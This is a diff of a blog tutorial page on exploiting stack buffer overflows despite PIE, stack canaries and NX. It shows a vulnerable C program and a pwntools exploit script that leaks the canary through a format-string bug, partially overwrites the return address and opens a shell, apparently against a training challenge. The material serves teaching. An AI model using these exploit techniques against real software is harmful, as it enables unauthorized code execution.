@@ -3,8 +3,8 @@
     <title>Emily Miller</title>
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
-    <meta name="description" content="This is a simple guide on how to perform basic buffer
-overflows, including an example exploit script." />
+    <meta name="description" content="Here&#39;s a (more) realistic guide on how to exploit a modern buffer
+overflow" />
 
     
     
@@ -84,23 +84,46 @@ overflows, including an example exploit script." />
 <div class="container">
     <div class="pl-sm-2">
         <div class="mb-3">
-            <h3 class="mb-0">How to: Basic buffer overflows without stack protections</h3>
+            <h3 class="mb-0">How to: Buffer overflows with PIE, Canaries, and NX Bit</h3>
             
             <small class="text-muted">Published February 10, 2025</small>
         </div>
 
         <article>
-            <p>Kind of starting a little basic, but what is a buffer overflow? Effectively,
-when the program is expecting a certain amount of data to be written, and more
-data than that gets written, <em>overflowing</em> the buffer. When done on the stack
-(the most basic case), this is often called <em>stack smashing</em> (likely popularized
-by the amazing stack canary message &ldquo;**** stack smashing detected ****&rdquo;).</p>
-<p>For instance, if our memory looks something like below:</p>
-<p><code>| Other function memory (variables, etc.) | Buffer | More function memory | return address |</code></p>
-<p>What we can do to gain control flow is write through that Buffer and the
-function memory and overwrite the return address. Often, this occurs in ret2win
-style challenges, where we need to return to some win function.</p>
-<p>Lets take the following code as our example:</p>
+            <p>What stack protections are we talking about? Here we&rsquo;re only talking about
+bypassing PIE, Stack Canaries, and NX Bit, because these are found in almost every binary
+compiled nowadays and you will be expected to know this in any basic binary
+exploitation exercise.</p>
+<h4 id="you-speak-all-these-words-woman-but-i-understand-not">You speak all these words, woman, but I understand not.</h4>
+<p><strong>What&rsquo;s PIE?</strong></p>
+<p>PIE stands for Position Independent Executable, and all it means is
+that it can get loaded into different positions in memory randomly at runtime,
+which makes exploitation a bit harder. How do we bypass this in terms of buffer
+overflows?  Using <em>partial address overwrites</em>! Instead of overwriting the
+entire buffer, we can only overwrite the last 2 bytes, and because of things get
+loaded in, 12 of those bytes will be the same every time, so we only need to
+brute force 2^4 or 16 combinations.</p>
+<p><strong>What&rsquo;s a stack canary?</strong></p>
+<p>Stack canaries are the bread and butter of modern buffer overflow protections.
+The idea is that we can place some specific (usually 8 byte) value between the
+function memory and the return address, and we check that this canary hasn&rsquo;t
+changed before jumping to that return pointer. If it has, we&rsquo;ll exit the
+program, and often give the error <code>**** stack smashing detected ****</code>. How do we
+bypass this? Well, there&rsquo;s 2 main ways: we can either jump / avoid the canary, for instance if we
+have something like <code>buffer[i] = ptr</code>, and we&rsquo;re able to control both <code>i</code> and
+<code>ptr</code>, we can avoid the canary all together. Otherwise, if we can leak the
+canary using a separate vulnerability we can overwrite it with the same address,
+bypassing the protection.</p>
+<p><strong>What&rsquo;s NX Bit?</strong></p>
+<p>NX Bit is a protection to mark some areas of memory as executable, some as
+writable, and some as read-only. This makes basic shellcode injections (for
+instance with NOP sleds), much harder. This means that when we don&rsquo;t have a win
+function, we&rsquo;re going to have to use pre-existing code to our advantage, using
+something like ROP or a <code>one_gadget</code> to find a de-facto win function.</p>
+<h4 id="worked-example">Worked example</h4>
+<p>Let&rsquo;s take our code from the previous challenge, except this time, we want to
+attack it without using compiler flags to disable any protections. See the code
+below:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">win</span>() {
 </span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">system</span>(<span style="color:#e6db74">&#34;/bin/sh&#34;</span>);
 </span></span><span style="display:flex;"><span>}
@@ -127,42 +150,48 @@ style challenges, where we need to return to some win function.</p>
 </span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">sprintf</span>(output, <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">%s</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">&#34;</span>, s);
 </span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> output;
 </span></span><span style="display:flex;"><span>}
-</span></span></code></pre></div><p>The example above looks a little convoluted, and I&rsquo;ve done that because that&rsquo;s
-what real buffer overflows look like. 99% of the time, these come from the
-programmer writing some piece of code to do some small task (in this case
-wrapping some string in quotes), and forgetting to account for issues that may
-arise with how things interact with it. The more experienced among you may notice
-a second vulnerability lurking in this program, but we&rsquo;ll cover that another
-time.</p>
-<p>Note if you want to follow at home, you will need to compile with stack
-protections disabled, which can be done like <code>gcc -fno-stack-protector -z noexecstack -no-pie -o vulnerable_program vulnerable_program.c</code> (Take a moment
-to notice just how many things we&rsquo;re having to disable in order to make this
-work &mdash; this is something that rarely happens in modern programs, which is why
-more advanced exploitation techniques are usually needed).
-`</p>
-<p>Here, we can use a very simple exploit to attack it:</p>
+</span></span></code></pre></div><p>Going piece by piece, what changes do we need to make to the exploit? Well,
+first, we&rsquo;re going to need to change our code to only perform a partial
+overwrite on the return address to bypass PIE. We&rsquo;re also going to need to find
+a way to leak the stack canary&hellip; luckily, we&rsquo;re given a win function, so NX bit
+is fairly trivial to bypass.</p>
+<p>How do we leak the canary? Well, this is where that whole second vulnerability
+thing comes in. In this case, in the <code>print_quoted</code> function, there&rsquo;s a format
+string vulnerability, which will allow us to leak the canary by inserting
+carefully constructed format string (notice how we&rsquo;re using the <code>printf</code> directly
+on the user input, meaning that whatever we type in will be treated as a format
+string). In this case, we&rsquo;ll only need a simple payload to leak the address, but
+in the future, you&rsquo;ll learn that you can actually often gain complete program
+control with a vulnerability like this.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e"># Hacker defined parameters</span>
-</span></span><span style="display:flex;"><span>process_name <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;./vulnerable_program&#34;</span>
-</span></span><span style="display:flex;"><span>offset <span style="color:#f92672">=</span> <span style="color:#ae81ff">64</span> <span style="color:#75715e"># Placeholder, you&#39;ll need to find this using GDB</span>
-</span></span><span style="display:flex;"><span>win_address <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x123456</span> <span style="color:#75715e"># You get this from GDB as well</span>
+</span></span><span style="display:flex;"><span>process_name <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;/challenge/babymem_level7.0&#34;</span>
+</span></span><span style="display:flex;"><span>offset <span style="color:#f92672">=</span> <span style="color:#ae81ff">123</span> <span style="color:#75715e"># Given by the program</span>
+</span></span><span style="display:flex;"><span>win_address <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x1234</span> <span style="color:#75715e"># You get this from GDB directly, notice the address is</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># shorter because only the last 2 bytes will stay the same</span>
+</span></span><span style="display:flex;"><span>format_string_offset <span style="color:#f92672">=</span> <span style="color:#ae81ff">12</span>
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e"># Calculate our payload</span>
-</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span>offset <span style="color:#f92672">+</span> p64(win_address) <span style="color:#75715e"># &lt;-- standard buffer overflow payload</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e"># Exploit</span>
 </span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> process(process_name)
-</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(bytes(str(offset<span style="color:#f92672">+</span><span style="color:#ae81ff">8</span>), <span style="color:#e6db74">&#34;utf-8&#34;</span>))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># This is a basic format string exploit to leak the canary and extract it into a</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># byte string, you don&#39;t need to worry about this for now</span>
+</span></span><span style="display:flex;"><span>payload_fmt <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;%&#34;</span> <span style="color:#f92672">+</span> bytes(str(format_string_offset), <span style="color:#e6db74">&#34;utf-8&#34;</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;$p&#34;</span>
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>recv()
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(payload_fmt)
+</span></span><span style="display:flex;"><span>canary_value <span style="color:#f92672">=</span> bytes<span style="color:#f92672">.</span>fromhex(p<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">11</span>)[<span style="color:#ae81ff">3</span>:])
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Back to the buffer overflow part</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span>(offset<span style="color:#f92672">-</span><span style="color:#ae81ff">16</span>) <span style="color:#f92672">+</span> canary_value <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;B&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">8</span> <span style="color:#f92672">+</span> p64(win_address) <span style="color:#75715e"># &lt;-- standard buffer overflow payload</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(bytes(str(offset<span style="color:#f92672">+</span><span style="color:#ae81ff">2</span>), <span style="color:#e6db74">&#34;utf-8&#34;</span>)) <span style="color:#75715e"># &lt;-- IMPORTANT: Make sure you only</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># overwrite 2 bytes of the address, because the payload, if done in full, will</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># fill the rest of the address with zeros and break it. You can do some</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># modifications of the payload if you have to, but this is easier for challenges like this</span>
+</span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(payload)
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e"># Reap the benefits</span>
-</span></span><span style="display:flex;"><span>data <span style="color:#f92672">=</span> p<span style="color:#f92672">.</span>interactive()
-</span></span></code></pre></div><p>Another important thing to keep in mind is those parameters need to be
-determined by you, the attacker. There are ways of getting around this,
-including automatic static analysis of the binary (some of which can be done in
-<code>pwntools</code>, albeit with some reliability issues) and fuzzing, but that&rsquo;s a topic
-to explore on your own as you gain more exploit development experience.</p>
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>interactive()
+</span></span></code></pre></div><p>So that&rsquo;s how you exploit a buffer overflow with protections!</p>
 
         </article>
     </div>
